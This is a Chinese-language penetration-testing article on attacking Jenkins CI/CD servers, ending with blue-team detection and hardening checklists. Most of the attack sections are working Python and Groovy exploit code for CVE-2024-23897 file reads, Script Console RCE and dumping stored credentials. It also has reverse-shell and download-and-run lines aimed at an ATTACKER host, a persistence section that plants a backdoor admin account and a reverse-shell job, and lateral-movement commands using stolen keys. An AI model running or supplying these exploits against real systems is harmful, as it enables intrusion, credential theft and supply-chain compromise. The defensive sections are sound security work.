---
title: "Jenkins CI/CD 任意文件读取 Groovy RCE 供应链投毒 CVE漏洞链利用技术"
date: 2025-07-03T00:00:00+08:00
draft: false
weight: 125
description: "深入分析 Jenkins CI/CD 的任意文件读取（CVE-2024-23897）、Agent 协议信任（CVE-2024-43044）、Groovy Script Console RCE、Pipeline 供应链投毒、凭据窃取、插件漏洞等完整攻击面，覆盖 2017-2025 年高危 CVE 漏洞链及蓝队检测与应急响应"
categories: ["安全","渗透测试"]
tags: ["Jenkins","CI/CD","CVE-2024-23897","CVE-2024-43044","Groovy","Script Console","供应链攻击","任意文件读取","RCE","DevSecOps"]
---

## 0x00 攻击面总览

Jenkins 是全球使用最广泛的开源 CI/CD 自动化平台，承载代码构建、测试、部署的全流程自动化。Jenkins 服务器存储源代码仓库凭据、云服务商密钥、代码签名证书、部署令牌等核心资产，一旦攻破，攻击者可直接投毒软件供应链——在构建产物中植入后门，以合法发布流程将恶意代码推送到生产环境：

| 攻击面 | 默认端口 | 风险等级 | 说明 |
|--------|---------|---------|------|
| Jenkins CLI | 8080/443 | **严重** | CVE-2024-23897 预认证任意文件读取，CVSS 9.8 |
| Groovy Script Console | 8080/443 | **严重** | 管理员认证后直接 RCE，无需插件 |
| Agent Remoting 协议 | 50000 | **严重** | CVE-2024-43044 Agent 信任边界违反，Agent 端 RCE |
| Pipeline / Jenkinsfile | 8080/443 | **严重** | Pipeline 投毒 = 供应链攻击 |
| 凭据存储 (Credentials) | 8080/443 | **严重** | master.key + credentials.xml 解密链 |
| 插件生态 | 8080/443 | **高危** | 数百个插件持续暴露 RCE/SSRF/认证绕过 |
| 管理 GUI | 8080/443 | **高危** | 弱口令、默认凭据、CSRF |
| JNLP Agent 端口 | 50000 | **高危** | 未加密通信、MitM 注入 |

Jenkins 的安全问题极其危险——它同时持有源代码、构建密钥、部署凭据和云服务商令牌，攻破 Jenkins 等于获得了整个软件供应链的"上帝权限"。

## 0x01 服务识别与版本探测

### 1.1 指纹识别

```bash
nmap -sV -p 8080,443,50000 <target>

curl -skI http://<target>:8080/
# X-Jenkins: 2.442
# X-Instance-Identity: ...

curl -sk http://<target>:8080/login
# Jenkins 登录页面

curl -sk http://<target>:8080/cli
# Jenkins CLI 端点

curl -sk http://<target>:8080/jnlpJars/jenkins-cli.jar -o jenkins-cli.jar
# 下载 CLI 工具
```

### 1.2 关键路径与端口映射

```
8080   — Jenkins Web GUI (HTTP)
443    — Jenkins Web GUI (HTTPS, 反向代理)
50000  — JNLP Agent 通信端口
```

### 1.3 关键 URL 路径

```
/login                                     — 登录页面
/cli                                       — CLI 端点 (CVE-2024-23897 入口)
/script                                    — Groovy Script Console (RCE)
/configure                                 — 系统配置
/credentials/                              — 凭据管理
/manage                                    — 管理面板
/pluginManager/                            — 插件管理
/env-vars/                                 — 环境变量
/api/json                                  — REST API
/computer/                                 — Agent 节点管理
/job/                                      — 任务列表
/view/                                     — 视图
/restart                                   — 重启 Jenkins
/jnlpJars/jenkins-cli.jar                  — CLI 工具下载
/jnlpJars/jenkins-war                      — WAR 包下载
```

### 1.4 版本探测

```python
import requests
import re

def detect_jenkins(host, port=8080):
    base_url = f"http://{host}:{port}"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

    print(f"[*] Scanning Jenkins at {base_url}")

    try:
        resp = requests.get(f"{base_url}/login", headers=headers, timeout=10, allow_redirects=False)
        print(f"[*] GET /login -> HTTP {resp.status_code}")

        jenkins_ver = resp.headers.get("X-Jenkins", "")
        if jenkins_ver:
            print(f"[+] Jenkins Version: {jenkins_ver}")
            parts = jenkins_ver.split(".")
            major = int(parts[0]) if len(parts) > 0 else 0
            minor = int(parts[1]) if len(parts) > 1 else 0
            if major == 2 and minor < 442:
                print("[!] Version < 2.442 — VULNERABLE to CVE-2024-23897")
            if major == 2 and minor < 471:
                print("[!] Version < 2.471 — VULNERABLE to CVE-2024-43044")

        identity = resp.headers.get("X-Instance-Identity", "")
        if identity:
            print(f"[+] Instance Identity present")
    except Exception:
        pass

    endpoints = ["/cli", "/script", "/api/json", "/credentials/"]
    for ep in endpoints:
        try:
            resp = requests.get(f"{base_url}{ep}", headers=headers, timeout=10, allow_redirects=False)
            status = resp.status_code
            marker = ""
            if status == 200:
                marker = " [ACCESSIBLE]"
            elif status == 403:
                marker = " [AUTH REQUIRED]"
            print(f"[+] {ep} -> HTTP {status}{marker}")
        except Exception:
            pass

    try:
        resp = requests.get(f"{base_url}/api/json", headers=headers, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            print(f"[+] Jenkins Mode: {data.get('mode', 'unknown')}")
            print(f"[+] Node Name: {data.get('nodeName', 'unknown')}")
            num_jobs = len(data.get("jobs", []))
            print(f"[+] Jobs Count: {num_jobs}")
    except Exception:
        pass

detect_jenkins("192.168.1.1")
```

## 0x02 CVE-2024-23897 — 预认证任意文件读取

### 2.1 漏洞原理

**CVSS**: 9.8（严重）| **CISA KEV**: 2024-02 纳入

**影响版本**: Jenkins < 2.442, LTS < 2.426.3

**漏洞原理**: Jenkins CLI 使用 `args4j` 库进行命令行参数解析。`args4j` 有一个特性：以 `@` 开头的参数被视为文件引用，库会读取该文件内容并将每行作为独立参数。当 CLI 请求通过 HTTP 发送时，`@filename` 展开在**服务端**执行，且发生在认证检查之前。攻击者可发送包含 `@/etc/passwd` 的 CLI 请求，Jenkins 会读取该文件并将内容包含在错误消息中返回。

**根本原因**: `args4j` 库的 `@file` 参数展开功能被暴露在网络协议中，且 CLI 端点默认接受未认证连接。

**高价值目标文件**:

| 文件路径 | 用途 |
|---------|------|
| `/etc/passwd` | 系统用户枚举 |
| `/etc/shadow` | 密码哈希（如可读） |
| `$JENKINS_HOME/secrets/master.key` | Jenkins 主加密密钥 |
| `$JENKINS_HOME/credentials.xml` | 存储的凭据（用 master.key 加密） |
| `$JENKINS_HOME/.ssh/id_rsa` | SSH 私钥 |
| `/proc/self/environ` | 环境变量（可能包含密钥） |
| `$JENKINS_HOME/config.xml` | Jenkins 配置 |
| `~/.aws/credentials` | AWS 凭据 |
| K8s serviceaccount token | 容器编排凭据 |

### 2.2 PoC — 任意文件读取

```python
import requests
import uuid
import sys
import struct

def exploit_cve_2024_23897(host, port=8080, file_path="/etc/passwd"):
    base_url = f"http://{host}:{port}"
    session_id = str(uuid.uuid4())

    print(f"[*] CVE-2024-23897 — Jenkins Arbitrary File Read")
    print(f"[*] Target: {base_url}")
    print(f"[*] File: {file_path}")

    cli_url = f"{base_url}/cli"

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Session": session_id,
        "Side": "download",
    }

    payload = f"@{file_path}"

    try:
        resp = requests.post(
            cli_url,
            headers=headers,
            data=payload.encode("utf-8"),
            timeout=15
        )
        print(f"[*] Response: HTTP {resp.status_code} ({len(resp.text)} bytes)")

        if "root:" in resp.text or "admin:" in resp.text:
            print(f"[+] File read successful!")
            print(resp.text[:500])
        elif "No such file" in resp.text:
            print(f"[-] File not found: {file_path}")
        elif len(resp.text) > 0:
            print(f"[*] Response content:")
            print(resp.text[:500])
        else:
            print(f"[-] Empty response")
    except Exception as e:
        print(f"[-] Error: {e}")

    print(f"\n[*] Attempting via jenkins-cli.jar method...")
    try:
        resp2 = requests.get(
            f"{base_url}/jnlpJars/jenkins-cli.jar",
            timeout=10
        )
        if resp2.status_code == 200:
            print(f"[+] jenkins-cli.jar downloadable ({len(resp2.content)} bytes)")
            print(f"[+] Use: java -jar jenkins-cli.jar -s {base_url}/ -http connect-server \"@{file_path}\"")
    except Exception:
        pass

exploit_cve_2024_23897("192.168.1.1", file_path="/etc/passwd")
```

### 2.3 PoC — 凭据窃取链（文件读取 → 解密 → RCE）

```python
import requests
import base64
import re

def exploit_jenkins_credential_chain(host, port=8080):
    base_url = f"http://{host}:{port}"

    print(f"[*] Jenkins Credential Theft Chain")
    print(f"[*] Target: {base_url}")

    target_files = [
        "/var/jenkins_home/secrets/master.key",
        "/var/jenkins_home/credentials.xml",
        "/var/jenkins_home/secrets/hudson.util.Secret",
        "/var/jenkins_home/.ssh/id_rsa",
        "/var/jenkins_home/config.xml",
        "/var/lib/jenkins/secrets/master.key",
        "/var/lib/jenkins/credentials.xml",
        "/root/.ssh/id_rsa",
        "/proc/self/environ",
    ]

    print("[*] Stage 1: Reading critical files via CVE-2024-23897...")
    for fpath in target_files:
        try:
            session_id = str(__import__("uuid").uuid4())
            resp = requests.post(
                f"{base_url}/cli",
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Session": session_id,
                    "Side": "download",
                },
                data=f"@{fpath}".encode("utf-8"),
                timeout=15
            )
            if len(resp.text) > 0 and "No such file" not in resp.text:
                print(f"[+] READ {fpath} ({len(resp.text)} bytes)")
                if "master.key" in fpath:
                    print(f"    Master key: {resp.text[:64].strip()}")
                elif "credentials.xml" in fpath:
                    encrypted = re.findall(r'<secret>([^<]+)</secret>', resp.text)
                    if encrypted:
                        print(f"    Found {len(encrypted)} encrypted credentials")
                elif "id_rsa" in fpath:
                    if "BEGIN" in resp.text:
                        print(f"    SSH private key extracted!")
            else:
                print(f"[-] NOT FOUND: {fpath}")
        except Exception:
            pass

    print("[*] Stage 2: Attempting credential decryption...")
    print("[*] If master.key + credentials.xml obtained:")
    print("[*]   1. Decode base64 encrypted values from credentials.xml")
    print("[*]   2. Use hudson.util.Secret decryption (AES-128-ECB)")
    print("[*]   3. Magic header: '::::MAGIC::::'")
    print("[*]   4. Decrypted values = plaintext passwords/API tokens")

    print("[*] Stage 3: Using stolen credentials for RCE...")
    print("[*]   POST /script with Groovy: \"whoami\".execute().text")
    print("[*]   Or create malicious Pipeline job")

exploit_jenkins_credential_chain("192.168.1.1")
```

## 0x03 Groovy Script Console RCE

### 3.1 漏洞原理

Jenkins 内置 Groovy Script Console（`/script`），允许管理员在 Jenkins JVM 中执行任意 Groovy 代码。这是一个**设计特性**而非漏洞，但在以下场景中成为致命攻击面：

- 管理员使用弱口令或默认凭据
- 通过 CVE-2024-23897 窃取管理员凭据
- 通过插件漏洞获取管理员权限
- CSRF 攻击诱导管理员访问恶意页面

### 3.2 PoC — Script Console RCE

```python
import requests
import re

def exploit_groovy_rce(host, port=8080, username="admin", password="admin"):
    base_url = f"http://{host}:{port}"

    print(f"[*] Jenkins Groovy Script Console RCE")
    print(f"[*] Target: {base_url}")

    session = requests.Session()

    print("[*] Stage 1: Authenticating...")
    try:
        resp = session.get(f"{base_url}/login", timeout=10)
        csrf_match = re.search(r'name="Jenkins-Crumb" value="([^"]+)"', resp.text)
        crumb = csrf_match.group(1) if csrf_match else ""

        resp = session.post(
            f"{base_url}/j_spring_security_check",
            data={"j_username": username, "j_password": password, "Submit": "Sign in"},
            headers={"Jenkins-Crumb": crumb},
            allow_redirects=False,
            timeout=10
        )
        if resp.status_code in [302, 200]:
            print(f"[+] Authentication successful")
    except Exception:
        pass

    print("[*] Stage 2: Executing Groovy code...")
    groovy_payloads = [
        ('"whoami".execute().text', "System identification"),
        ('"id".execute().text', "User context"),
        ('"hostname".execute().text', "Hostname"),
        ('"cat /etc/os-release".execute().text', "OS info"),
        ('System.getenv().collect{it.toString()}.join("\\n")', "Environment variables"),
    ]

    for payload, desc in groovy_payloads:
        try:
            resp = session.post(
                f"{base_url}/script",
                data={"script": payload, "Jenkins-Crumb": crumb},
                headers={"Jenkins-Crumb": crumb},
                timeout=15
            )
            result_match = re.search(r'<pre class="result">(.*?)</pre>', resp.text, re.DOTALL)
            if result_match:
                result = result_match.group(1).strip()
                print(f"[+] {desc}: {result[:200]}")
            else:
                print(f"[-] {desc}: No result (auth required or error)")
        except Exception:
            pass

    print("[*] Stage 3: Advanced Groovy payloads...")
    print("[*] Reverse shell:")
    print('[*]   def cmd = "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"')
    print('[*]   def proc = cmd.execute()')
    print("[*]")
    print("[*] Download & execute:")
    print('[*]   "wget http://ATTACKER/shell.sh -O /tmp/s.sh".execute()')
    print('[*]   "chmod +x /tmp/s.sh && /tmp/s.sh".execute()')
    print("[*]")
    print("[*] Read files:")
    print('[*]   new File("/etc/passwd").text')
    print("[*]")
    print("[*] List all credentials:")
    print('[*]   import com.cloudbees.plugins.credentials.*')
    print('[*]   CredentialsProvider.lookupCredentials(')
    print('[*]     com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class')
    print('[*]   ).each { println("${it.username}:${it.password}") }')

exploit_groovy_rce("192.168.1.1")
```

## 0x04 CVE-2024-43044 — Agent 协议信任违反

### 4.1 漏洞原理

**CVSS**: 8.4（高危）

**影响版本**: Jenkins < 2.471, LTS < 2.452.4

**漏洞原理**: Jenkins 使用 Remoting 协议在 Controller 和 Agent 之间通信。该协议本质上信任来自 Controller 的所有消息，Agent 不验证命令来源的真实性。这创造三种攻击向量：

- **向量一: Controller 被攻破** — 攻击者控制 Controller 后可向所有 Agent 发送任意命令
- **向量二: 中间人攻击** — Agent 使用未加密 TCP（默认端口 50000）通信时，网络层攻击者可注入恶意命令
- **向量三: 伪造 Controller** — 攻击者冒充 Controller 连接 Agent 并执行任意代码

### 4.2 PoC — Agent 端口探测

```python
import socket
import struct

def probe_jenkins_agent(host, port=50000):
    print(f"[*] CVE-2024-43044 — Jenkins Agent Protocol Probe")
    print(f"[*] Target: {host}:{port}")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))

        response = sock.recv(1024)
        print(f"[+] Agent port open — received {len(response)} bytes")
        print(f"[+] Response (hex): {response.hex()}")

        if len(response) > 0:
            print(f"[!] Agent accepted connection from unauthorized source")
            print(f"[!] VULNERABLE to CVE-2024-43044 (trust boundary)")
        sock.close()
    except socket.timeout:
        print(f"[-] Connection timeout — port may be filtered")
    except ConnectionRefusedError:
        print(f"[-] Connection refused — agent port not listening")
    except Exception as e:
        print(f"[-] Error: {e}")

    print(f"\n[*] Checking if agent traffic is encrypted...")
    try:
        import ssl
        context = ssl.create_default_context()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        ssl_sock = context.wrap_socket(sock, server_hostname=host)
        ssl_sock.connect((host, port))
        print(f"[+] Agent port uses TLS — encrypted communication")
        ssl_sock.close()
    except ssl.SSLError:
        print(f"[!] Agent port does NOT use TLS — unencrypted remoting traffic!")
        print(f"[!] Vulnerable to MitM injection")
    except Exception:
        print(f"[*] TLS check inconclusive")

probe_jenkins_agent("192.168.1.1")
```

## 0x05 Pipeline 供应链投毒

### 5.1 攻击原理

Jenkins Pipeline 是软件供应链的核心环节。攻击者一旦获得 Jenkins 管理员权限，可修改 Pipeline 配置或 Jenkinsfile，在构建产物中植入后门：

```
修改 Pipeline → 构建时注入后门 → 产物通过正常发布流程部署 → 生产环境被攻陷
```

### 5.2 PoC — Pipeline 投毒检测

```python
import requests
import re

def detect_pipeline_poisoning(host, port=8080, username="admin", password="admin"):
    base_url = f"http://{host}:{port}"

    print(f"[*] Jenkins Pipeline Supply Chain Poisoning Detection")
    print(f"[*] Target: {base_url}")

    session = requests.Session()
    session.auth = (username, password)

    print("[*] Stage 1: Enumerating jobs...")
    try:
        resp = session.get(f"{base_url}/api/json?tree=jobs[name,url,color]", timeout=10)
        if resp.status_code == 200:
            jobs = resp.json().get("jobs", [])
            print(f"[+] Found {len(jobs)} jobs")
            for job in jobs:
                print(f"    - {job['name']} ({job.get('color', 'unknown')})")
    except Exception:
        pass

    print("[*] Stage 2: Checking Pipeline configurations...")
    suspicious_patterns = [
        "curl.*-d.*@",
        "wget.*http",
        "base64.*-d",
        "nc.*-e",
        "/dev/tcp/",
        "bash.*-i",
        "python.*-c",
        "eval\\(",
        "exec\\(",
        "Runtime.getRuntime",
        "ProcessBuilder",
    ]

    try:
        resp = session.get(f"{base_url}/api/json?tree=jobs[name,url]", timeout=10)
        if resp.status_code == 200:
            jobs = resp.json().get("jobs", [])
            for job in jobs[:20]:
                job_name = job["name"]
                try:
                    config_resp = session.get(
                        f"{base_url}/job/{job_name}/config.xml",
                        timeout=10
                    )
                    if config_resp.status_code == 200:
                        config = config_resp.text
                        for pattern in suspicious_patterns:
                            if re.search(pattern, config):
                                print(f"[!] SUSPICIOUS: {job_name} matches pattern: {pattern}")
                except Exception:
                    pass
    except Exception:
        pass

    print("[*] Stage 3: Checking for recently modified pipelines...")
    print("[*]   Compare build artifact hashes against known-good baselines")
    print("[*]   Review Jenkinsfile changes in SCM for unauthorized modifications")
    print("[*]   Check for new 'sh' steps in Pipeline configurations")

detect_pipeline_poisoning("192.168.1.1")
```

## 0x06 后利用技术

### 6.1 凭据提取

```python
import requests
import re

def extract_jenkins_credentials(host, port=8080, username="admin", password="admin"):
    base_url = f"http://{host}:{port}"
    session = requests.Session()
    session.auth = (username, password)

    print(f"[*] Jenkins Credential Extraction")
    print(f"[*] Target: {base_url}")

    print("[*] Stage 1: Extracting environment variables...")
    try:
        resp = session.post(
            f"{base_url}/script",
            data={"script": 'System.getenv().collect{it.toString()}.join("\\n")'},
            timeout=15
        )
        result = re.search(r'<pre class="result">(.*?)</pre>', resp.text, re.DOTALL)
        if result:
            env_vars = result.group(1).strip()
            print(f"[+] Environment variables:\n{env_vars[:500]}")
    except Exception:
        pass

    print("[*] Stage 2: Extracting stored credentials...")
    cred_script = """
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
import com.cloudbees.jenkins.plugins.sshcredentials.impl.*
import org.jenkinsci.plugins.plaincredentials.*

def creds = CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class
)
creds.each {
    println("User: ${it.username} | Pass: ${it.password}")
}

def sshCreds = CredentialsProvider.lookupCredentials(
    BasicSSHUserPrivateKey.class
)
sshCreds.each {
    println("SSH: ${it.username} | Key: ${it.privateKey?.take(100)}")
}

def secretCreds = CredentialsProvider.lookupCredentials(
    StringCredentials.class
)
secretCreds.each {
    println("Secret: ${it.secret}")
}
"""
    try:
        resp = session.post(
            f"{base_url}/script",
            data={"script": cred_script},
            timeout=15
        )
        result = re.search(r'<pre class="result">(.*?)</pre>', resp.text, re.DOTALL)
        if result:
            print(f"[+] Credentials:\n{result.group(1).strip()[:500]}")
    except Exception:
        pass

    print("[*] Stage 3: Extracting cloud credentials...")
    cloud_script = """
def envVars = System.getenv()
['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AZURE_CLIENT_SECRET',
 'GOOGLE_APPLICATION_CREDENTIALS', 'DOCKER_PASSWORD', 'GITHUB_TOKEN',
 'NPM_TOKEN', 'PYPI_PASSWORD'].each { key ->
    if (envVars[key]) {
        println("${key} = ${envVars[key]}")
    }
}
"""
    try:
        resp = session.post(
            f"{base_url}/script",
            data={"script": cloud_script},
            timeout=15
        )
        result = re.search(r'<pre class="result">(.*?)</pre>', resp.text, re.DOTALL)
        if result:
            cloud_creds = result.group(1).strip()
            if cloud_creds:
                print(f"[+] Cloud credentials found:\n{cloud_creds}")
    except Exception:
        pass

extract_jenkins_credentials("192.168.1.1")
```

### 6.2 横向移动

```bash
# 使用窃取的 SSH 密钥访问构建 Agent
ssh -i extracted_id_rsa build-agent@10.0.0.50

# 使用窃取的 AWS 凭据访问云环境
export AWS_ACCESS_KEY_ID=STOLEN_KEY
export AWS_SECRET_ACCESS_KEY=STOLEN_SECRET
aws s3 ls
aws ec2 describe-instances

# 使用窃取的 Docker 凭据拉取/推送镜像
docker login -u admin -p STOLEN_PASSWORD registry.internal.com
docker pull registry.internal.com/production/app:latest

# 使用窃取的 K8s token 访问集群
kubectl --server=https://k8s.internal:6443 \
  --token=STOLEN_TOKEN get pods --all-namespaces
```

### 6.3 持久化

```groovy
// Jenkins Script Console 持久化

// 1. 创建隐藏管理员账户
import jenkins.model.*
import hudson.security.*
def realm = Jenkins.instance.getSecurityRealm()
if (realm instanceof HudsonPrivateSecurityRealm) {
    realm.createAccount("backdoor", "P@ssw0rd123")
}

// 2. 创建定时反弹 Shell Pipeline
def job = Jenkins.instance.createProject(FreeStyleProject, "health-check")
job.buildersList.add(new hudson.tasks.Shell(
    "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"
))
job.schedule.build(new hudson.model.CauseAction())

// 3. 安装恶意插件
// 上传包含后门代码的 .hpi 插件文件
```

## 0x07 漏洞组合攻击链

### 7.1 攻击链一: 文件读取 → 凭据解密 → Script Console RCE

```
CVE-2024-23897 (任意文件读取)
    ↓ @/var/jenkins_home/secrets/master.key
    ↓ @/var/jenkins_home/credentials.xml
提取 master.key + credentials.xml
    ↓ AES-128-ECB 解密 (::::MAGIC::::)
解密管理员凭据
    ↓ 登录 Jenkins 管理面板
Groovy Script Console RCE
    ↓ "whoami".execute().text
完全控制 Jenkins 服务器
```

### 7.2 攻击链二: 文件读取 → SSH 密钥 → Agent 横向移动

```
CVE-2024-23897 (任意文件读取)
    ↓ @/var/jenkins_home/.ssh/id_rsa
提取 SSH 私钥
    ↓ 使用私钥连接构建 Agent
Agent 节点接管
    ↓ 窃取源代码、构建产物、部署凭据
供应链攻击
    ↓ 修改构建产物 / 注入后门
```

### 7.3 攻击链三: 弱口令 → Pipeline 投毒 → 生产环境攻陷

```
弱口令 / 默认凭据
    ↓ admin:admin 登录 Jenkins
修改 Pipeline 配置
    ↓ 在构建步骤中注入后门代码
正常构建流程
    ↓ 后门代码被编译到产物中
部署到生产环境
    ↓ 生产系统被攻陷
```

### 7.4 攻击链四: Agent 信任违反 → 全集群 RCE

```
CVE-2024-43044 (Agent 协议信任)
    ↓ Controller 被攻破 / MitM / 伪造 Controller
向所有 Agent 发送恶意命令
    ↓ Remoting 协议无加密无签名
全集群 RCE
    ↓ 所有 Agent 节点执行攻击者代码
供应链全面沦陷
    ↓ 源代码 + 构建产物 + 部署流水线
```

### 7.5 APT 威胁组织 TTP

| 威胁组织 | 类型 | 使用的技术 | 技术特征 |
|---------|------|-----------|---------|
| SUNSPOT (SolarWinds) | 国家级 APT | Pipeline 投毒 | 修改构建配置注入后门代码 |
| 多个勒索组织 | 勒索组织 | CVE-2024-23897 | 文件读取 → 凭据窃取 → 勒索部署 |
| 供应链攻击组织 | APT | Jenkins 凭据窃取 | 窃取代码签名证书 / 部署密钥 |

## 0x08 历史 CVE 漏洞时间线

### 2017-2019 — 早期漏洞

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2017-1000353 | 2017 | 8.0 | 反序列化 | Jenkins CLI 反序列化 RCE |
| CVE-2018-1000861 | 2018 | 9.8 | 认证绕过 | Stapler 路由绕过 RCE |
| CVE-2019-1003000 | 2019 | 6.8 | 沙箱绕过 | Groovy 沙箱逃逸 |
| CVE-2019-1003029 | 2019 | 6.8 | 沙箱绕过 | Groovy 沙箱逃逸 |

### 2024 — 高危爆发

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2024-23897 | 2024 | 9.8 | 任意文件读取 | CLI args4j @file 展开，CISA KEV |
| CVE-2024-43044 | 2024 | 8.4 | 信任违反 | Agent Remoting 协议信任边界 |
| CVE-2024-43045 | 2024 | 8.4 | 信任违反 | Agent 消息注入 |

### 漏洞类型分布

| 漏洞类型 | CVE 数量 | 代表性 CVE |
|---------|---------|-----------|
| RCE / 反序列化 | 3 | CVE-2017-1000353, CVE-2018-1000861 |
| 认证绕过 | 2 | CVE-2018-1000861 |
| 沙箱逃逸 | 4 | CVE-2019-1003000, CVE-2019-1003029 |
| 任意文件读取 | 1 | CVE-2024-23897 |
| 信任违反 | 2 | CVE-2024-43044, CVE-2024-43045 |

## 0x09 蓝队检测与应急响应

### 9.1 日志分析

```bash
# Jenkins 访问日志
grep "POST /cli" /var/log/jenkins/access.log | awk '{print $1}' | sort | uniq -c | sort -rn

# 检测 CVE-2024-23897 特征
grep -E "@(/etc/|/var/|/proc/|/root/)" /var/log/jenkins/access.log

# 检测 Script Console 使用
grep "POST /script" /var/log/jenkins/access.log | awk '{print $1, $4}' | sort

# 检测异常 Agent 连接
grep "Agent connected" $JENKINS_HOME/logs/all_jenkins.log | awk '{print $NF}' | sort | uniq -c

# 检测 Pipeline 异常修改
grep "config.xml" /var/log/jenkins/access.log | grep "POST" | head -20

# 检测凭据访问
grep "credentials" /var/log/jenkins/access.log | head -20
```

### 9.2 应急响应清单

```
[ ] 确认 Jenkins 版本
    - 检查 X-Jenkins Header
    - 对比安全公告

[ ] 排查 CVE-2024-23897 (任意文件读取)
    - 检查 /cli 端点异常访问
    - 搜索 @/etc/passwd 等文件读取特征
    - 检查 master.key 和 credentials.xml 是否泄露
    - 如已泄露：立即轮换所有凭据

[ ] 排查 Groovy Script Console 滥用
    - 检查 /script 端点访问记录
    - 审查所有 Groovy 脚本执行历史
    - 检查是否有新建的恶意 Pipeline

[ ] 排查 Agent 协议安全
    - 检查端口 50000 的连接来源
    - 确认 Agent 通信是否使用 TLS
    - 检查是否有未授权的 Agent 连接

[ ] 排查供应链投毒
    - 对比构建产物哈希与已知安全基线
    - 审查 Jenkinsfile 最近修改
    - 检查 Pipeline 配置中的异常 sh/bat 步骤

[ ] 网络隔离与加固
    - 立即升级 Jenkins 到最新版本
    - 禁用 CLI 端点 (jenkins.CLI.disabled=true)
    - 限制 Script Console 访问
    - Agent 端口启用 TLS
    - 轮换所有存储的凭据
```

## 0x0A 安全审计清单

```
[ ] Jenkins 已升级到最新版本 (>= 2.471 / LTS >= 2.452.4)
[ ] CLI 端点已禁用或限制访问
[ ] Groovy Script Console 仅限必要管理员访问
[ ] Agent 通信已启用 TLS 加密
[ ] Agent 端口 (50000) 已限制为 Controller IP
[ ] 已禁用不安全的 Agent 协议
[ ] 管理员使用强密码 + MFA
[ ] 默认 admin 凭据已修改
[ ] 已启用 Jenkins 审计日志插件
[ ] 凭据存储已加密且定期轮换
[ ] Pipeline 配置变更已启用审批流程
[ ] 构建产物哈希已建立基线并定期校验
[ ] 已配置 SIEM 规则检测异常 CLI/Script/Pipeline 活动
[ ] Jenkins 服务器已网络隔离
[ ] Jenkins 不直接暴露于互联网
[ ] 已订阅 Jenkins 安全公告通知
[ ] 已建立 Jenkins 应急响应预案
[ ] 插件已定期更新并审查权限
[ ] Groovy 沙箱已启用（非管理员 Pipeline）
[ ] CSRF 保护已启用
```

## 0x0B 总结

Jenkins 的安全问题核心在于"CI/CD 平台的超高价值属性"与"默认配置的过度信任"：

1. **CVE-2024-23897 的毁灭性影响**: 一个 `args4j` 库的 `@file` 参数展开特性，让攻击者无需认证即可读取 Jenkins 服务器上的任意文件——包括 master.key 和 credentials.xml，直接解锁整个凭据库
2. **Script Console 的双刃剑**: Groovy Script Console 是 Jenkins 最强大的管理工具，但也是攻击者的终极武器——一旦获得管理员权限，一行 Groovy 代码即可 RCE
3. **供应链攻击的核心节点**: Jenkins 持有源代码、构建密钥、部署凭据和云服务商令牌，Pipeline 投毒可将后门代码以合法发布流程推送到生产环境，SUNSPOT (SolarWinds) 事件已证明这是国家级 APT 的首选攻击路径
4. **Agent 协议的信任缺陷**: CVE-2024-43044 揭示了 Jenkins Remoting 协议的根本性设计缺陷——Agent 无条件信任 Controller 的所有指令，无加密无签名

防守方核心策略：
- **立即升级**: Jenkins 必须在安全公告发布后第一时间更新
- **禁用 CLI**: 设置 `jenkins.CLI.disabled=true`，消除 CVE-2024-23897 攻击面
- **限制 Script Console**: 仅限必要管理员访问，启用审计日志
- **Agent TLS**: 所有 Agent 通信必须使用 TLS 加密，禁用明文协议
- **凭据轮换**: 定期轮换 Jenkins 中存储的所有凭据，使用外部密钥管理系统
- **Pipeline 审计**: 启用 Pipeline 配置变更审批流程，建立构建产物哈希基线
- **网络隔离**: Jenkins 绝对不直接暴露于互联网，Agent 端口仅限 Controller IP
- **供应链监控**: 对比构建产物哈希、审查 Jenkinsfile 变更、监控异常 sh/bat 步骤
